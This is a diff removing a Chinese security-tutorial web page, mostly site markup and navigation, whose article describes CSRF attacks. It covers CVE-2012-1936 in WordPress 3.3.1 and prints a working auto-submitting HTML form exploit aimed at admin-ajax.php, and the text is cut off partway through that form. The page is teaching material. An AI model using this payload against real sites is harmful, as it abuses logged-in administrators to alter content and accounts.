@@ -1,1597 +1,229 @@
-<!DOCTYPE html><html lang="zh" >
-
-
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  
-  
-  
-    <meta name="generator" content="Wowchemy 5.5.0 for Hugo" />
-  
-
-  
-  
-
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-  
-  
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  
-
-  
-  
-  
-    
-      
-      <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap">
-      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap" media="print" onload="this.media='all'">
-    
-  
-
-  
-    <meta name="google-site-verification" content="google69a5cccb61297807" />
-    <meta name="baidu-site-verification" content="cqmZHEleVh" />
-  
-  
-  
-  
-  
-
-  
-
-  
-  
-  
-    
-  
-  <meta name="description" content="Exploits 本部分我们来看几个基于 CSRF 攻击的实例，包括简单的基于表单 POST 请求的攻击，其可以诱导用户点击.submit() 按钮既可以发起攻击。其他的还有稍微复杂一点的跨域文件上传 CSRF 攻击，其主要使用了 CORS use of the xhr.withCredentals beha" />
-
-  
-  <link rel="alternate" hreflang="zh" href="https://ng-tech.icu/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/csrf/%E6%94%BB%E5%87%BB%E5%AE%9E%E4%BE%8B/" />
-
-  
-  
-  
-    <meta name="theme-color" content="#0a55a7" />
-  
-
-  
-  
-
-  
-
-  <link rel="stylesheet" href="/css/vendor-bundle.min.c7b8d9abd591ba2253ea42747e3ac3f5.css" media="print" onload="this.media='all'">
-
-  
-  
-  
-    
-    
-
-    
-    
-    
-    
-      
-      
-    
-    
-    
-
-    
-    
-    
-      
-    
-    
-      
-      
-        
-          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.1/styles/github.min.css" crossorigin="anonymous" title="hl-light" media="print" onload="this.media='all'">
-          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.1/styles/dracula.min.css" crossorigin="anonymous" title="hl-dark" media="print" onload="this.media='all'" disabled>
-        
-      
-    
-
-    
-    
-    
-
-    
-      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/instantsearch.css@7.4.5/themes/satellite-min.css" integrity="sha256-TehzF/2QvNKhGQrrNpoOb2Ck4iGZ1J/DI4pkd2oUsBc=" crossorigin="anonymous">
-    
-
-    
-    
-      
-      
-
-      
-      
-
-      
-    
-      
-      
-
-      
-      
-
-      
-    
-      
-      
-
-      
-      
-
-      
-    
-      
-      
-
-      
-      
-
-      
-    
-      
-      
-
-      
-      
-
-      
-    
-      
-      
-
-      
-      
-
-      
-    
-      
-      
-
-      
-      
-
-      
-    
-      
-      
-
-      
-      
-
-      
-    
-      
-      
-
-      
-      
-
-      
-    
-      
-      
-
-      
-      
-
-      
-    
-      
-      
-
-      
-      
-
-      
-    
-      
-      
-
-      
-      
-
-      
-    
-      
-      
-
-      
-      
-        
-      
-
-      
-    
-      
-      
-
-      
-      
-
-      
-    
-      
-      
-
-      
-      
-
-      
-    
-  
-
-  
-  
-  
-  
-  
-  <link rel="stylesheet" href="/css/wowchemy.63df6ae9fc2b4cc71b83f1774d780209.css" />
-
-  
-
-
-
-
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-40NYXJ8823"></script>
-
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-  gtag('config', "G-40NYXJ8823");
-</script>
-
-
-  
-
-
-  
-
-
-  
-
-
-  <script>
-    var _hmt = _hmt || [];
-    (function() {
-      var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?56df1177bce405601b0ecdd7208f75c6";
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(hm, s);
-    })();
-  </script>
-
-
-
-  
-  
-  
-
-  
-
-  
-    <link rel="manifest" href="/manifest.webmanifest" />
-  
-
-  <link rel="icon" type="image/png" href="/media/icon_hu0f7d075e895d6f5f1f5fdbc1e33dc138_10087_32x32_fill_lanczos_center_3.png" />
-  <link rel="apple-touch-icon" type="image/png" href="/media/icon_hu0f7d075e895d6f5f1f5fdbc1e33dc138_10087_180x180_fill_lanczos_center_3.png" />
-
-  <link rel="canonical" href="https://ng-tech.icu/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/csrf/%E6%94%BB%E5%87%BB%E5%AE%9E%E4%BE%8B/" />
-
-  
-  
-  
-  
-  
-  
-  
-  
-    
-  
-  
-
-  
-  
-    
-    
-  
-  <meta property="twitter:card" content="summary_large_image" />
-  
-    <meta property="twitter:site" content="@wx-chevalier" />
-    <meta property="twitter:creator" content="@wx-chevalier" />
-  
-  <meta property="og:site_name" content="Next-gen Tech Edu" />
-  <meta property="og:url" content="https://ng-tech.icu/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/csrf/%E6%94%BB%E5%87%BB%E5%AE%9E%E4%BE%8B/" />
-  <meta property="og:title" content="攻击实例 | Next-gen Tech Edu" />
-  <meta property="og:description" content="Exploits 本部分我们来看几个基于 CSRF 攻击的实例，包括简单的基于表单 POST 请求的攻击，其可以诱导用户点击.submit() 按钮既可以发起攻击。其他的还有稍微复杂一点的跨域文件上传 CSRF 攻击，其主要使用了 CORS use of the xhr.withCredentals beha" /><meta property="og:image" content="https://ng-tech.icu/media/sharing.png" />
-    <meta property="twitter:image" content="https://ng-tech.icu/media/sharing.png" /><meta property="og:locale" content="zh" />
-  
-    
-    
-  
-
-  
-
-
-
-  
-
-  
-
-  
-
-
-
-
-
-  <title>攻击实例 | Next-gen Tech Edu</title>
-</head>
-
-
-<body id="top" data-spy="scroll" data-offset="70" data-target="#TableOfContents" class="page-wrapper   " data-wc-page-id="04763d261209bbc0694e1575dcbf3685" >
-  <button onclick="topFunction()" id="backTopBtn" title="Go to top"><i class="fa-solid fa-circle-up" aria-hidden="true"></i></button>
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  <script src="/js/wowchemy-init.min.14a0ed61c6dbd594b9c75193b25be179.js"></script>
-
-  
-
-
-<aside class="search-modal" id="search">
-  <div class="container">
-    <section class="search-header">
-
-      <div class="row no-gutters justify-content-between mb-3">
-        <div class="col-6 search-title">
-          <p>搜索</p>
-        </div>
-        <div class="col-6 col-search-close">
-          <a class="js-search" href="#" aria-label="关闭"><i class="fas fa-times-circle text-muted" aria-hidden="true"></i></a>
-        </div>
-      </div>
-
-      <div id="search-box">
-        
-        
-        
-      </div>
-
-      
-      
-
-      
-    </section>
-    <section class="section-search-results">
-
-      <div id="search-hits">
-        
-      </div>
-
-      <div id="search-common-queries">
-        
-      </div>
-
-    </section>
-  </div>
-</aside>
-
-
-
-  <div class="page-header">
-    
-
-
-
-
-
-
-
-
-
-
-
-
-<header class="header--fixed">
-  <nav class="navbar navbar-expand-lg navbar-light compensate-for-scrollbar" id="navbar-main">
-    <div class="container-xl">
-
-      
-      <div class="d-none d-lg-inline-flex">
-        <a class="navbar-brand" href="/">Next-gen Tech Edu</a>
-      </div>
-      
-
-      
-      <button type="button" class="navbar-toggler" data-toggle="collapse"
-              data-target="#navbar-content" aria-controls="navbar-content" aria-expanded="false" aria-label="切换导航">
-      <span><i class="fas fa-bars"></i></span>
-      </button>
-      
-
-      
-      <div class="navbar-brand-mobile-wrapper d-inline-flex d-lg-none">
-        <a class="navbar-brand" href="/">Next-gen Tech Edu</a>
-      </div>
-      
-
-      
-      
-      <div class="navbar-collapse main-menu-item collapse justify-content-start" id="navbar-content">
-
-        
-        <ul class="navbar-nav d-md-inline-flex">
-          
-
-          
-
-          
-          
-          
-            
-          
-
-          
-
-          
-          
-          
-          
-
-          
-            
-              
-              
-            
-            
-          
-
-          <li class="nav-item">
-            <a class="nav-link " href="/books-gallery"><span>笔记（万篇）</span></a>
-          </li>
-
-          
-          
-
-          
-
-          
-          
-          
-            
-          
-
-          
-
-          
-          
-          
-          
-
-          
-            
-              
-              
-            
-            
-              
-              
-              
-                
-              
-              
-            
-          
-
-          <li class="nav-item">
-            <a class="nav-link " href="/#knowledge-map"><span>知识图谱</span></a>
-          </li>
-
-          
-          
-
-          
-          <style>
-            .dropdown-item{
-              display: inline-flex;
-            }
-          </style>
-          <li class="nav-item dropdown">
-            <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown" aria-haspopup="true"><span>实验室</span><span class="caret"></span>
-            </a>
-            <div class="dropdown-menu">
-              
-                <a class="dropdown-item" href="/galaxy-home/gh-craft"><span>Craft 方块世界</span></a>
-              
-                <a class="dropdown-item" href="/galaxy-home/glossary-cards"><span>3D 知识卡牌</span></a>
-              
-            </div>
-          </li>
-
-          
-          
-
-          
-          <style>
-            .dropdown-item{
-              display: inline-flex;
-            }
-          </style>
-          <li class="nav-item dropdown">
-            <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown" aria-haspopup="true"><span>其他阅读渠道</span><span class="caret"></span>
-            </a>
-            <div class="dropdown-menu">
-              
-                <a class="dropdown-item" href="https://zhuanlan.zhihu.com/wxyyxc1992"><img style="width:16px;height:16px;display:inline-block;margin-right:8px" src="https://ngte-superbed.oss-cn-beijing.aliyuncs.com/item/20230218234451.png"></img><span>知乎</span></a>
-              
-                <a class="dropdown-item" href="https://segmentfault.com/blog/wxyyxc1992"><img style="width:16px;height:16px;display:inline-block;margin-right:8px" src="https://ngte-superbed.oss-cn-beijing.aliyuncs.com/item/20230219113556.png"></img><span>SegmentFault</span></a>
-              
-                <a class="dropdown-item" href="https://zhuanlan.zhihu.com/wxyyxc1992"><img style="width:16px;height:16px;display:inline-block;margin-right:8px" src="https://ngte-superbed.oss-cn-beijing.aliyuncs.com/item/20230219113519.png"></img><span>掘金</span></a>
-              
-            </div>
-          </li>
-
-          
-          
-
-        
-
-          
-        </ul>
-      </div>
-
-      <ul class="nav-icons navbar-nav flex-row ml-auto d-flex pl-md-2">
-
-        
-        
-        
-        <li class="nav-item">
-          <a class="nav-link js-search" href="#" aria-label="搜索"><i class="fas fa-search" aria-hidden="true"></i></a>
-        </li>
-        
-
-        
-        
-        <li class="nav-item">
-            <a class="nav-link" href="https://github.com/wx-chevalier" aria-label="GitHub"><i class="fa-brands fa-github" aria-hidden="true"></i></a>
-        </li>
-        
-
-        
-        
-        
-
-        
-        
-        
-        <div></div>
-        
-        <style>
-        @media only screen and (max-width: 600px) {
-          .jimmysong-template {
-            display: none!important;
-          }
-        }
-        </style>
-        
-        <li class="jimmysong-template" style="color: white;font-size: 12px;">
-          <a href="https://jimmysong.io" style="color: white">By Jimmy Song's Template</a>
-        </li>
-      </ul>
-
-    </div>
-  </nav>
-</header>
-
-
-  </div>
-
-  <div class="page-body">
-    
-    
-    
-
-    
-
-
-
-
-<link rel="stylesheet" href="//unpkg.com/heti/umd/heti.min.css">
-<div class="container-xl docs">
-  <div class="row flex-xl-nowrap">
-    <div class="docs-sidebar">
-      <form class="docs-search d-flex align-items-center">
-  <button class="btn docs-toggle d-md-none p-0 mr-md-3 w-100" type="button" data-toggle="collapse" data-target="#docs-nav" aria-controls="docs-nav" aria-expanded="false" aria-label="Toggle section navigation">
-    <div class="d-flex">
-      <span class="d-md-none pl-1 flex-grow-1 text-left overflow-hidden">
-        
-          CSRF
-        
-      </span>
-      <span><i class="fas fa-chevron-down"></i></span>
-    </div>
-  </button>
-
-  
-  <button class="form-control sidebar-search js-search d-none d-md-flex">
-    <i class="fas fa-search pr-2"></i>
-    <span class="sidebar-search-text">搜索...</span>
-    <span class="sidebar-search-shortcut">/</span>
-  </button>
-  
-</form>
-
-<nav class="collapse docs-links" id="docs-nav">
-  
-  
-  
-  
-  
-  
-
-  
-  
-    
-
-    
-      
-
-      <ul class="nav docs-sidenav">
-        <li style="display: inline-flex">
-          <a style="cursor: pointer;" onclick="window.history.back()">
-            <i class="fas fa-arrow-left pr-1"></i>
-            Back
-          </a>
-          <span>|</span>
-          <a href="/books/">
-            <i class="fa-solid fa-house" style="margin-right: 4px"></i>
-            Books
-          </a>
-        </li>
-      </ul>
-
-      
-      
-        
-          
-        
-      
-
-
-
-  
-    
-    
-    
-    
-      
-    
-    
-
-    
-    
-    
-    
-    
-    <div class="docs-toc-item has-child">
-    <div class="parent-node d-flex justify-content-between" onClick="Collapse(&#34;caret-idd7c5ff9a31787a6ec431da0956444724&#34;)" href="#idd7c5ff9a31787a6ec431da0956444724" aria-expanded="false" aria-controls="idd7c5ff9a31787a6ec431da0956444724" aria-hidden="false" data-toggle="collapse">
-    
-    <a class="d-inline docs-toc-link " href="/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/">Web 安全</a>
-    <a class="nav-toogle d-inline level" aria-hidden="false" data-toggle="collapse" href="#idd7c5ff9a31787a6ec431da0956444724" aria-expanded="false" aria-controls="idd7c5ff9a31787a6ec431da0956444724">
-    
-    <i class="fa-solid fa-angle-down" id="caret-idd7c5ff9a31787a6ec431da0956444724"></i>
-    
-    </a>
-    
-    </div>
-    
-      
-      <ul class="nav docs-sidenav collapse  show " id="idd7c5ff9a31787a6ec431da0956444724">
-      
-
-
-
-  
-    
-    
-    
-    
-      
-    
-    
-
-    
-    
-    
-    
-    
-    <div class="docs-toc-item has-child">
-    <div class="parent-node d-flex justify-content-between" onClick="Collapse(&#34;caret-id102de254e3b66d69676966617443d6d8&#34;)" href="#id102de254e3b66d69676966617443d6d8" aria-expanded="false" aria-controls="id102de254e3b66d69676966617443d6d8" aria-hidden="false" data-toggle="collapse">
-    
-    <a class="d-inline docs-toc-link " href="/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/csrf/">CSRF</a>
-    <a class="nav-toogle d-inline level" aria-hidden="false" data-toggle="collapse" href="#id102de254e3b66d69676966617443d6d8" aria-expanded="false" aria-controls="id102de254e3b66d69676966617443d6d8">
-    
-    <i class="fa-solid fa-angle-down" id="caret-id102de254e3b66d69676966617443d6d8"></i>
-    
-    </a>
-    
-    </div>
-    
-      
-      <ul class="nav docs-sidenav collapse  show " id="id102de254e3b66d69676966617443d6d8">
-      
-
-
-
-  <li class="child level "><a href="/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/csrf/%E9%98%B2%E5%BE%A1%E4%BF%AE%E5%A4%8D/">防御修复</a></li>
-
-
-
-
-  <li class="child level active"><a href="/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/csrf/%E6%94%BB%E5%87%BB%E5%AE%9E%E4%BE%8B/">攻击实例</a></li>
-
-
-
-
-  <li class="child level "><a href="/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/csrf/%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/">漏洞检测</a></li>
-
-      
-        </ul>
-      
-    
-
-    
-      </div>
-    
-
-
-
-
-  
-    
-    
-    
-    
-      
-    
-    
-
-    
-    
-    
-    <div class="docs-toc-item has-child">
-    <div class="parent-node d-flex justify-content-between" onClick="Collapse(&#34;caret-id11c46297e5b5fcb43e57a5b7873b4743&#34;)" href="#id11c46297e5b5fcb43e57a5b7873b4743" aria-expanded="false" aria-controls="id11c46297e5b5fcb43e57a5b7873b4743" aria-hidden="false" data-toggle="collapse">
-    
-    <a class="d-inline docs-toc-link " href="/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/sql-%E6%B3%A8%E5%85%A5/">SQL 注入</a>
-    <a class="nav-toogle d-inline level" aria-hidden="false" data-toggle="collapse" href="#id11c46297e5b5fcb43e57a5b7873b4743" aria-expanded="false" aria-controls="id11c46297e5b5fcb43e57a5b7873b4743">
-    
-        <i class="fa-solid fa-angle-right" id="caret-id11c46297e5b5fcb43e57a5b7873b4743"></i>
-    
-    </a>
-    
-    </div>
-    
-      
-      <ul class="nav docs-sidenav collapse  " id="id11c46297e5b5fcb43e57a5b7873b4743">
-      
-
-
-
-  <li class="child level "><a href="/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/sql-%E6%B3%A8%E5%85%A5/sql-%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/">SQL 注入工具</a></li>
-
-      
-        </ul>
-      
-    
-
-    
-      </div>
-    
-
-
-
-
-  
-    
-    
-    
-    
-      
-    
-    
-
-    
-    
-    
-    <div class="docs-toc-item has-child">
-    <div class="parent-node d-flex justify-content-between" onClick="Collapse(&#34;caret-idbd394d3c524abe70dba7d26ea927ed8e&#34;)" href="#idbd394d3c524abe70dba7d26ea927ed8e" aria-expanded="false" aria-controls="idbd394d3c524abe70dba7d26ea927ed8e" aria-hidden="false" data-toggle="collapse">
-    
-    <a class="d-inline docs-toc-link " href="/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/xss/">XSS</a>
-    <a class="nav-toogle d-inline level" aria-hidden="false" data-toggle="collapse" href="#idbd394d3c524abe70dba7d26ea927ed8e" aria-expanded="false" aria-controls="idbd394d3c524abe70dba7d26ea927ed8e">
-    
-        <i class="fa-solid fa-angle-right" id="caret-idbd394d3c524abe70dba7d26ea927ed8e"></i>
-    
-    </a>
-    
-    </div>
-    
-      
-      <ul class="nav docs-sidenav collapse  " id="idbd394d3c524abe70dba7d26ea927ed8e">
-      
-
-
-
-  <li class="child level "><a href="/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/xss/%E9%98%B2%E5%BE%A1%E4%BF%AE%E5%A4%8D/">防御修复</a></li>
-
-
-
-
-  <li class="child level "><a href="/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/xss/%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/">漏洞检测</a></li>
-
-      
-        </ul>
-      
-    
-
-    
-      </div>
-    
-
-
-
-
-  
-    
-    
-    
-    
-      
-    
-    
-
-    
-    
-    
-    <div class="docs-toc-item has-child">
-    <div class="parent-node d-flex justify-content-between" onClick="Collapse(&#34;caret-id99f6411072a00e529c0646bc79e3ca24&#34;)" href="#id99f6411072a00e529c0646bc79e3ca24" aria-expanded="false" aria-controls="id99f6411072a00e529c0646bc79e3ca24" aria-hidden="false" data-toggle="collapse">
-    
-    <a class="d-inline docs-toc-link " href="/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/%E7%BC%96%E7%A0%81%E6%A0%A1%E9%AA%8C/">编码校验</a>
-    <a class="nav-toogle d-inline level" aria-hidden="false" data-toggle="collapse" href="#id99f6411072a00e529c0646bc79e3ca24" aria-expanded="false" aria-controls="id99f6411072a00e529c0646bc79e3ca24">
-    
-        <i class="fa-solid fa-angle-right" id="caret-id99f6411072a00e529c0646bc79e3ca24"></i>
-    
-    </a>
-    
-    </div>
-    
-      
-      <ul class="nav docs-sidenav collapse  " id="id99f6411072a00e529c0646bc79e3ca24">
-      
-
-
-
-  <li class="child level "><a href="/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/%E7%BC%96%E7%A0%81%E6%A0%A1%E9%AA%8C/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/">代码混淆</a></li>
-
-
-
-
-  <li class="child level "><a href="/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/%E7%BC%96%E7%A0%81%E6%A0%A1%E9%AA%8C/%E8%87%AA%E5%8A%A8%E5%A1%AB%E5%85%85/">自动填充</a></li>
-
-      
-        </ul>
-      
-    
-
-    
-      </div>
-    
-
-
-
-
-  
-    
-    
-    
-    
-      
-    
-    
-
-    
-    
-    
-    <div class="docs-toc-item has-child">
-    <div class="parent-node d-flex justify-content-between" onClick="Collapse(&#34;caret-idafa0d417f45896e8046977ed09c88263&#34;)" href="#idafa0d417f45896e8046977ed09c88263" aria-expanded="false" aria-controls="idafa0d417f45896e8046977ed09c88263" aria-hidden="false" data-toggle="collapse">
-    
-    </div>
-    
-
-    
-      </div>
-    
-
-
-
-
-  
-    
-    
-    
-    
-      
-    
-    
-
-    
-    
-    
-    <div class="docs-toc-item has-child">
-    <div class="parent-node d-flex justify-content-between" onClick="Collapse(&#34;caret-id9f1f5b6620f7369f8f6f86bd95b92d6f&#34;)" href="#id9f1f5b6620f7369f8f6f86bd95b92d6f" aria-expanded="false" aria-controls="id9f1f5b6620f7369f8f6f86bd95b92d6f" aria-hidden="false" data-toggle="collapse">
-    
-    </div>
-    
-
-    
-      </div>
-    
-
-
-
-
-  
-    
-    
-    
-    
-      
-    
-    
-
-    
-    
-    
-    <div class="docs-toc-item has-child">
-    <div class="parent-node d-flex justify-content-between" onClick="Collapse(&#34;caret-id789c09d4fce111b0d69c2eb4ff3e7ab9&#34;)" href="#id789c09d4fce111b0d69c2eb4ff3e7ab9" aria-expanded="false" aria-controls="id789c09d4fce111b0d69c2eb4ff3e7ab9" aria-hidden="false" data-toggle="collapse">
-    
-    </div>
-    
-
-    
-      </div>
-    
-
-      
-        </ul>
-      
-    
-
-    
-      </div>
-    
-
-    
-  
-</nav>
-
-    </div>
-
-    
-    
-    <div class="d-none d-xl-block col-xl-2 docs-toc">
-      
-     
-      <ul class="nav toc-top">
-        <li><a href="#" id="back_to_top" class="docs-toc-title">目录</a></li>
-      </ul>
-     
-
-      <nav id="TableOfContents">
-  <ul>
-    <li><a href="#wordpress-331-multiple-csrf-vulnerabilitieshttpswwwexploit-dbcomexploits18791"><a href="https://www.exploit-db.com/exploits/18791/">Wordpress 3.3.1 Multiple CSRF Vulnerabilities</a></a></li>
-    <li><a href="#oracle-glassfish-server---rest-cross-site-request-forgery">Oracle GlassFish Server - REST Cross-Site Request Forgery</a></li>
-  </ul>
-</nav>
-
-      
-<div class="subscribe-module col-24 mt-1">
-    <img src="https://ngte-superbed.oss-cn-beijing.aliyuncs.com/item/20230220172727.png" alt="image" title="王下邀月熊的微信公众号"/>
-</div>
-
-
-
-    </div>
-    
-
-    <main class="py-md-3 pl-md-3 docs-content col-xl-8" role="main">
-
-      <article class="article">
-
-          
-
-          <h1>攻击实例</h1>
-
-          <div class="article-style">
-            <h1 id="exploits">Exploits</h1>
-<p>本部分我们来看几个基于 CSRF 攻击的实例，包括<a href="http://www.exploit-db.com/exploits/18791/" target="_blank" rel="noopener">简单的基于表单 POST 请求的攻击</a>，其可以诱导用户点击<code>.submit()</code> 按钮既可以发起攻击。其他的还有稍微复杂一点的<a href="http://www.exploit-db.com/exploits/18766/" target="_blank" rel="noopener">跨域文件上传 CSRF 攻击</a>，其主要使用了 <a href="http://blog.kotowicz.net/2011/05/cross-domain-arbitrary-file-upload.html" target="_blank" rel="noopener">CORS use of the xhr.withCredentals behavior</a>。</p>
-<h2 id="wordpress-331-multiple-csrf-vulnerabilitieshttpswwwexploit-dbcomexploits18791"><a href="https://www.exploit-db.com/exploits/18791/" target="_blank" rel="noopener">Wordpress 3.3.1 Multiple CSRF Vulnerabilities</a></h2>
-<p>该漏洞是由<a href="http://www.ivanobinetti.com" target="_blank" rel="noopener">Ivano Binetti</a>在 2012 年 3 月 19 号发现的，影响了<a href="http://wordpress.org/wordpress-3.3.1.zip" target="_blank" rel="noopener">WordPress 3.3.1 版本 </a>，CVE 编号 CVE-2012-1936。WordPress 是众所周知的博客平台，该漏洞可以允许攻击者修改某个 Post 的标题，添加管理权限用户以及操作用户账户，包括但不限于删除评论、修改头像等等。具体的列表如下</p>
-<ul>
-<li>Add Admin/User</li>
-<li>Delete Admin/User</li>
-<li>Approve comment</li>
-<li>Unapprove comment</li>
-<li>Delete comment</li>
-<li>Change background image</li>
-<li>Insert custom header image</li>
-<li>Change site title</li>
-<li>Change administrator&rsquo;s email</li>
-<li>Change Wordpress Address</li>
-<li>Change Site Address</li>
-</ul>
-<p>那么这个漏洞实际上就是攻击者引导用户先进入目标的 WordPress，然后点击其钓鱼站点上的某个按钮，该按钮实际上是表单提交按钮，其会触发表单的提交工作，核心的 Exploit 代码为</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">body</span> <span class="na">onload</span><span class="o">=</span><span class="s">&#34;javascript:document.forms[0].submit()&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>CSRF Exploit to change post title<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">form</span>
-</span></span><span class="line"><span class="cl">      <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span>
-</span></span><span class="line"><span class="cl">      <span class="na">name</span><span class="o">=</span><span class="s">&#34;form0&#34;</span>
-</span></span><span class="line"><span class="cl">      <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://&lt;wordpress_ip&gt;:80/wp-admin/admin-ajax.php&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;post_title&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;hackedtitle&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;post_name&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;hackedtitle&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;mm&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;03&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;jj&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;16&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;aa&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;2012&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;hh&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;mn&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;ss&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;post_author&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;1&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;post_password&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;post_category%5B%5D&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;0&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;post_category%5B%5D&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;1&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;tax_input%5Bpost_tag%5D&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;comment_status&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;open&#34;</span> <span class="p">/&gt;</span>
